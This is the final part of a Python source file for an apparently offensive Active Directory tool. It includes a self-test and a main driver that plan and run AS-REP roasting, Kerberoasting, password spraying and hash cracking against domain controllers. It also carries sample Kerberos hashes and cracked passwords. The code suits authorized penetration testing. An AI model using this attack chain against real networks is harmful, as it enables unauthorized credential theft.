    h.ports = {53: {}, 88: {}, 135: {}, 139: {}, 389: {}, 445: {}, 3268: {}}
    for u in ("svc-sql", "jdoe", "administrator"):
        _add_user(h, u, "test")
    inp = Inputs(userlist="u.txt", passlist="p.txt")
    targs = _a.Namespace(safe=False, output="./windesk_out", domain="corp.local")
    strat = CredentialStrategist(inp, targs)
    eng = ExpertPlanner(quiet=True)
    f = Facts(h, inp, targs, strat, None)
    ranked = eng.rank(f, set(eng.LOOP))
    keys = [a.key for (_, ready, _, a) in ranked if ready]
    check("planner readies asrep on DC+users", "asrep" in keys)
    check("planner readies spray on DC+lists", "spray" in keys)
    check("planner withholds kerberoast w/o cred", "kerberoast" not in keys)
    paths = {name: state for name, state, _ in eng.backchain(f)}
    check("backchain: AS-REP path READY", paths.get("AS-REP roast → crack") == "ready")
    check("backchain: Kerberoast path PENDING (not blocked)",
          paths.get("Kerberoast → crack") == "pending")

    # a DC before domain is known: AS-REP should read PENDING, not blocked
    h3 = HostRecord(ip="10.0.0.11")
    h3.ports = {88: {}, 389: {}, 445: {}, 135: {}}
    f3 = Facts(h3, inp, _a.Namespace(safe=False, output=".", domain=""), strat, None)
    paths3 = {name: state for name, state, _ in eng.backchain(f3)}
    check("backchain: AS-REP PENDING before domain known",
          paths3.get("AS-REP roast → crack") == "pending")

    # once a credential exists, kerberoast + reuse + adcs + bloodhound unlock
    _add_credential(h, "svc-sql", "Summer2025!", "corp.local", "crack:AS-REP")
    f2 = Facts(h, inp, targs, strat, _current_cred(h, inp))
    check("access flag set after cred", f2.access)
    ranked2 = eng.rank(f2, set(eng.LOOP))
    keys2 = [a.key for (_, ready, _, a) in ranked2 if ready]
    check("kerberoast unlocks with cred", "kerberoast" in keys2)
    check("reuse-spray unlocks with cred", "spray-reuse" in keys2)
    check("bloodhound unlocks with cred", "bloodhound" in keys2)
    check("tier order: discovery before attacks",
          [a.key for (_, _, _, a) in eng.rank(f, set(eng.LOOP))].index("smb-null") <
          [a.key for (_, _, _, a) in eng.rank(f, set(eng.LOOP))].index("asrep"))

    # hash parsers
    hh = HostRecord(ip="1.1.1.1")
    n = _add_asrep_hash(hh, None, "$krb5asrep$23$jdoe@CORP.LOCAL:abcd$ef01")
    check("asrep hash parsed + account", n == 1 and hh.hashes[0]["account"] == "jdoe")
    n = _add_tgs_hash(hh, "$krb5tgs$23$*svc-sql$CORP.LOCAL$MSSQL*$aaaa$bbbb")
    check("tgs hash parsed + account", n == 1 and hh.hashes[1]["account"] == "svc-sql")
    cr = {}
    _parse_cracked("$krb5asrep$23$jdoe@CORP.LOCAL:abcd$ef01:Password123", cr, 18200)
    check("cracked line → user:pass", cr.get("jdoe") == "Password123")

    head("Self-Test Result")
    (ok if failed == 0 else fail)(f"{passed} passed, {failed} failed")
    return 0 if failed == 0 else 1


def main():
    args = build_parser().parse_args()
    global _NO_COLOUR, _SHOW_RAW
    _NO_COLOUR = args.no_color or not sys.stdout.isatty()
    _SHOW_RAW = args.raw

    if args.self_test:
        banner()
        sys.exit(self_test())

    banner()
    targets = expand_targets(args.targets, args.target_file)
    if not targets:
        build_parser().print_help()
        print()
        fail("No targets. Provide IP/CIDR/range/host or --target-file.")
        sys.exit(2)
    warn("Authorized engagements only — signed scope / written ROE required. "
         "You are responsible for the targets you point this at.")

    prof = build_profile(args.approach, args)
    engine = ExpertPlanner(quiet=args.quiet_plan)
    inp = Inputs(domain=args.domain or "", username=args.username or "",
                 password=args.password or "", nthash=args.hashes or "",
                 userlist=args.userlist or "", passlist=args.passlist or "",
                 local_auth=args.local_auth, kerberos=args.kerberos)

    head(f"winDesk v{__version__} — Enumeration + Credential-Access Engine | "
         f"approach={prof.name}{' | SAFE (no attacks)' if args.safe else ''}")
    info(f"Targets : {len(targets)}")
    info(f"Inputs  : {inp.describe()}")
    info(f"Output  : {args.output}")
    info(f"Scope   : credential access + post-cred enumeration — no interactive access / "
         f"secretsdump / DCSync / lateral movement")
    kb = "disabled" if args.no_kerbrute_timeout else f"{args.kerbrute_timeout}s"
    sp = "disabled" if args.no_spray_timeout else f"{args.spray_timeout}s"
    info(f"Timeouts: kerbrute={kb}  spray={sp}  crack={args.crack_timeout}s per step "
         f"(change: --kerbrute-timeout/--spray-timeout/--crack-timeout N; "
         f"disable: --no-kerbrute-timeout/--no-spray-timeout)")
    if not IMPACKET_LIB and not impacket_tool("GetNPUsers"):
        warn("impacket not found — impacket/roast phases will degrade or skip")
    if not LDAP3_LIB and not have("ldapsearch"):
        warn("ldap3 and ldapsearch both unavailable — LDAP deep queries disabled")
    record_tool_versions()
    if STORE.tool_versions:
        tbl(["TOOL", "VERSION"], [[k, v] for k, v in STORE.tool_versions.items()],
            title="Detected tooling")

    seen: Set[str] = set()
    for t in targets:
        STORE.queue.append(t)
    try:
        if prof.name == "noisy" and prof.concurrency > 1 and len(STORE.queue) > 1:
            initial = list(STORE.queue)
            STORE.queue.clear()

            def _w(tt):
                try:
                    process_host(tt, args, prof, engine, inp, seen)
                except KeyboardInterrupt:
                    raise
                except Exception as e:
                    fail(f"[{tt}] {type(e).__name__}: {e}")

            with _cf.ThreadPoolExecutor(max_workers=prof.concurrency) as ex:
                list(ex.map(_w, initial))
            while STORE.queue:
                safe(process_host, STORE.queue.pop(0), args, prof, engine, inp, seen)
        else:
            while STORE.queue:
                nxt = STORE.queue.pop(0)
                try:
                    process_host(nxt, args, prof, engine, inp, seen)
                except KeyboardInterrupt:
                    raise
                except Exception as e:
                    fail(f"[{nxt}] {type(e).__name__}: {e}")
    except KeyboardInterrupt:
        fail("\nInterrupted — writing partial report")
    head("Reporting")
    save_report(args, prof)
    creds = sum(len(h.credentials) for h in STORE.hosts.values())
    if creds:
        win(f"Done. {creds} valid credential(s) recovered — stopped at access "
            f"(no post-exploitation).")
    else:
        ok("Done. Enumeration + credential-access chain complete.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)

